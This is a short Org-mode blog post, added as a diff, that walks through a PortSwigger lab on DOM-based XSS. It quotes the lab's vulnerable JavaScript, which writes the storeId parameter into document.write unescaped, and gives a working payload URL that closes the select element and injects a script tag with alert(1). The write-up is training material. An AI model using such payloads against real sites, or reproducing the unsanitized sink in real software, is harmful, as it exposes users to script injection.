@@ -1,0 +1,64 @@
+#+TITLE: WSA: DOM XSS in document.write sink using source location.search
+#+DATE: <2024-02-27 10:07>
+#+DESCRIPTION:  Walktrough of WSA Lab: DOM XSS in document.write sink using source location.search inside a select element
+#+FILETAGS: wsa xss domxss
+
+* Introduction
+Not much to say here, just glad to have found some time for challenges ;P
+
+* Challenge
+You can check the lab out: [[https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element][here]]
+
+Starting with the usual progress, checking stuff, while allowing all
+traffic through our proxy to be able to replicate any requests later
+on. [fn:1]
+
+In each product page there is a "Check Stock" functionality, which
+after previewing the source code, is handled by the following
+javascript snippet:
+#+NAME: Vulnerable snippet
+#+begin_src javascript
+var stores = ["London","Paris","Milan"];
+var store = (new URLSearchParams(window.location.search)).get('storeId');
+document.write('<select name="storeId">');
+if(store) {
+    document.write('<option selected>'+store+'</option>');
+}
+for(var i=0;i<stores.length;i++) {
+    if(stores[i] === store) {
+        continue;
+    }
+    document.write('<option>'+stores[i]+'</option>');
+}
+document.write('</select>');
+#+end_src
+
+In our request we can see that, the variables can be modified:
+#+begin_example
+productId=1&storeId=London
+#+end_example
+
+Sample link that gives us the desired output in console:
+#+begin_example
+https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?productId=1&storeId=asdfasdf
+#+end_example
+
+After that it was tedious: We just had to get out of the existing
+environments and add a script one:
+#+begin_example
+https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?productId=1&storeId=</option></select><script>alert(1)</script>
+#+end_example
+
+
+* Summary
+This was the first challenge I completed for the day, and I think it
+was the perfect way to start it: not too easy, but at the same time
+not too difficult.
+
+Paying some attention to the vulnerable snippet was all that was
+needed here!
+
+
+* Footnotes
+
+[fn:1] Not really necessary, knowing that we check for DOM XSS but all is fine. 
